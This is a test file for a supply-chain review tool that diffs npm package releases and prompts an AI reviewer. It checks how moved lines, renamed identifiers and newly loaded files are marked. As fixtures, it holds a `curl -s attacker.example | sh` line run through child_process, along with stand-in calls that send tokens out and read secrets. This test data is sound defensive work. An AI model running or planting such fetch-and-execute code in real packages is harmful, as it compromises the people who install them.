import { describe, expect, test } from "bun:test";
import { reviewUpdate, chunkDiff } from "../src/review.ts";
import { renderLineDiff } from "../src/linediff.ts";
import type { FileMap } from "../src/prepass.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const pj = (o: object = {}) => JSON.stringify({ name: "lib", version: "1.0.0", main: "index.js", ...o });
const full = (old: FileMap, now: FileMap) => chunkDiff(old, now, 50_000).join("");
const lines = (out: string) => out.split("\n");

describe("present-before mark", () => {
  test("a function moved within a bundle shows its long lines as =, a new line in the same hunk as +", () => {
    const alpha = "function alpha() {\n  return computeTheAlphaValue(1, 2, 3);\n}\n";
    const beta = (extra: string) => `function beta() {\n  return computeTheBetaValue(4, 5, 6);\n${extra}}\n`;
    const out = full(
      files({ "package.json": pj(), "index.js": alpha + beta("") + "module.exports = { alpha, beta };\n" }),
      files({ "package.json": pj({ version: "1.0.1" }), "index.js": beta("  sendTokensToRemoteHost(process.env);\n") + alpha + "module.exports = { alpha, beta };\n" }),
    );
    const l = lines(out);
    expect(l).toContain("+  sendTokensToRemoteHost(process.env);");
    // Whichever function the diff shows as moved, its long line is marked, never a plain +.
    expect(l.some((x) => /^=  return computeThe(Alpha|Beta)Value/.test(x))).toBe(true);
    expect(l.some((x) => /^\+  return computeThe(Alpha|Beta)Value/.test(x))).toBe(false);
  });

  test("a line under 24 non-space characters the old release has still shows +", () => {
    const out = full(
      files({ "package.json": pj(), "index.js": "a()\nshort_one(1);\nb()\n" }),
      files({ "package.json": pj({ version: "1.0.1" }), "index.js": "a()\nshort_one(1);\nb()\nshort_one(1);\n" }),
    );
    expect(lines(out)).toContain("+short_one(1);");
  });

  test("a line the old release has in a different file is marked =, whitespace runs ignored", () => {
    const out = full(
      files({ "package.json": pj(), "index.js": "a()\n", "lib/util.js": "    const handler = buildTheRequestHandler(opts);\n" }),
      files({ "package.json": pj({ version: "1.0.1" }), "index.js": "a()\nconst  handler = buildTheRequestHandler(opts);\n", "lib/util.js": "" }),
    );
    expect(lines(out)).toContain("=const  handler = buildTheRequestHandler(opts);");
  });

  test("a newly reached unchanged file is shown with + lines, never =", () => {
    const data = "const payloadData = readSecretsFromDisk(process.env.HOME);\nmodule.exports = payloadData;\n";
    const out = full(
      files({ "package.json": pj(), "index.js": "a()\n", "data.js": data }),
      files({ "package.json": pj({ version: "1.0.1" }), "index.js": "require('./data.js')\n", "data.js": data }),
    );
    expect(out).toContain("=== data.js (now loaded by changed code, unchanged) ===");
    expect(lines(out)).toContain("+const payloadData = readSecretsFromDisk(process.env.HOME);");
    expect(lines(out).some((x) => /^=(?!==)/.test(x))).toBe(false);
  });

  test("renderLineDiff with no old-line set renders as before", () => {
    expect(renderLineDiff("let x = computeSomethingLong(1, 2);\nreturn x;\nend()", "return x;\nlet x = computeSomethingLong(1, 2);\nend()")).toBe(
      "@@ -1 +1 @@\n-let x = computeSomethingLong(1, 2);\n@@ -3 +2 @@\n+let x = computeSomethingLong(1, 2);\n",
    );
  });

  test("the prompt explains = lines and rename lists", async () => {
    const prompts: string[] = [];
    await reviewUpdate({
      eco: "npm", name: "lib", from: "1.0.0", to: "1.0.1",
      registry: { latest: async () => undefined, publishedAt: async () => new Date("2020-01-01"), artifactUrls: async () => [] },
      advisories: { query: async () => [] },
      reviewer: { name: "fake", review: async (p) => (prompts.push(p), "APPROVE\nno attack indicators found") },
      cooldownDays: 1, now: new Date("2026-10-21T00:00:00Z"),
      loadArtifacts: async () => ({ old: files({ "package.json": pj(), "index.js": "a()\n" }), new: files({ "package.json": pj({ version: "1.0.1" }), "index.js": "b()\n" }) }),
    });
    expect(prompts.length).toBeGreaterThan(0);
    expect(prompts[0]).toContain("A `=` line is an added line whose text the old release already has elsewhere");
    expect(prompts[0]).toContain("[only identifiers renamed: …]");
  });
});

describe("minifier renames in ~ lines", () => {
  const pad = "q.push(1);".repeat(60);
  const tilde = (a: string, b: string) => {
    const out = full(
      files({ "package.json": pj(), "index.js": `${pad}${a}\n` }),
      files({ "package.json": pj({ version: "1.0.1" }), "index.js": `${pad}${b}\n` }),
    );
    return lines(out).filter((l) => l.startsWith("~"));
  };

  test("a line that differs only by consistent short renames is named as such", () => {
    expect(tilde("aF(1);aF(2);bQ(3)", "dF(1);dF(2);cQ(3)")).toEqual(["~[only identifiers renamed: aF→dF, bQ→cQ]"]);
  });

  test("more than five renames are counted, not listed", () => {
    const a = ["a1", "a2", "a3", "a4", "a5", "a6", "a7"];
    const t = tilde(a.map((n) => `${n}();`).join(""), a.map((n) => `${n.replace("a", "b")}();`).join(""));
    expect(t).toEqual(["~[only identifiers renamed: a1→b1, a2→b2, a3→b3, a4→b4, a5→b5 and 2 more]"]);
  });

  test("a rename beside a real change shows the change and lists the rename", () => {
    const [t] = tilde('aF(1);run("ok")', 'dF(1);run("evil")');
    expect(t).toContain("[-ok-]{+evil+}");
    expect(t).toContain("dF(1)");
    expect(t).not.toContain("[-aF-]");
    expect(t!.endsWith(" [renamed: aF→dF]")).toBe(true);
  });

  test("a rename to a longer name or an inconsistent mapping is shown as a change", () => {
    const [longer] = tilde("aF(1)", "eval(1)");
    expect(longer).toContain("[-aF-]{+eval+}");
    expect(longer).not.toContain("renamed");
    const [split] = tilde("aF(1);aF(2)", "dF(1);eF(2)");
    expect(split).toContain("[-aF-]{+dF+}");
    expect(split).toContain("[-aF-]{+eF+}");
    expect(split).not.toContain("renamed");
    const [into] = tilde("aF(1);bQ(2)", "bQ(1);bQ(2)");
    expect(into).toContain("[-aF-]{+bQ+}");
    expect(into).not.toContain("renamed");
    const [left] = tilde("aF(1);aF(2)", "dF(1);aF(2)");
    expect(left).toContain("[-aF-]{+dF+}");
    expect(left).not.toContain("renamed");
    const [merged] = tilde("aF(1);bF(2)", "dF(1);dF(2)");
    expect(merged).toContain("[-aF-]{+dF+}");
    expect(merged).toContain("[-bF-]{+dF+}");
    expect(merged).not.toContain("renamed");
  });
});

test("a line the old release had only in an inert file (a doc) is not marked present-before", () => {
  const line = "require('child_process').execSync('curl -s attacker.example | sh')";
  const out = chunkDiff(
    files({ "README.md": `${line}\n`, "index.js": "a()\n" }),
    files({ "README.md": `${line}\n`, "index.js": `a()\n${line}\n` }),
    50_000,
  ).join("");
  expect(out).toContain(`+${line}`);
  expect(out).not.toContain(`=${line}`);
});
